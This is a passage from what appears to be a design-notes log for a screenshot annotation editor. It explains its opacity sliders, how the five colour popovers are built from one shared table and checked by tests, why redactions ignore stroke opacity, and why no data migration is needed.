light and the words still fight the picture, too solid and the caption looks
pasted on. That is a number. It is an opacity slider now, at nought per cent by
default, and the plate keeps its colour while it is invisible so that bringing
one back is one drag rather than a hunt for a colour first.

**So transparent has to count as off.** `isFramedText` used to be true whenever
a caption had a stroke or a fill colour. With a plate that keeps white at nought
per cent, that would make every plain caption framed, and a framed caption is
visibly bigger than its words by the padding: the selection outline, the hover
outline, the hit test and the export all grow. A caption you cannot click where
you can see it. So the test is now whether anything would actually be drawn.

**Opacity everywhere, and the condition attached to it.** A translucent border
or arrow over a screenshot is genuinely wanted and there was no way to get one.
Translucent text is rarer, though it is exactly what F23's watermark will need.
The cost was the part worth arguing about: there were five colour popovers in the
markup and they were five hand-written copies of one panel, so a slider in each
would have been five copies of a bigger panel. That is the shape D52 removed from
the output formats, where a format in two lists and missing from the third failed
silently in both directions.

So `PAINTS` in `src/lib/edit.js` describes them once, `buildPaintPopovers()` in
`result.js` builds all five from it, and `test/invariants.test.js` holds the two
together in both directions: a shell the table says nothing about, and a kind
with no shell, are both build failures. The Frame popover gained the sixty step
grid it never had as a side effect of being built the same way as the others,
which was the third request and cost nothing.

**Border and Frame write the same property, and so do Fill and Plate.** `colour`
is the stroke of every shape and the stroke of a caption is the frame around it.
Two controls reaching one property, rather than two properties that have to be
kept in step, which is what the old text panel got wrong before D46.

**A redaction never takes the stroke opacity.** It is the one shape here that
exists to remove part of the picture rather than mark it, and an opacity it could
inherit would be a way to read through it, set from a popover three controls away
from the tool. `drawShape` refuses it and `drawPixelated` sets the alpha back to
one, which is deliberately saying it twice: both lines have to be deleted before
a redaction can be made see-through. The e2e draws one with the stroke opacity at
nothing and checks it still hides, and the mutation that lets the opacity through
fails it.

**Migration is nothing.** Stroke and ink opacity default to one, which is what
every shape drawn before they existed had, so an opacity nobody has touched
cannot be told apart from one that was never stored. No shape is converted and no
capture annotated last week draws differently.
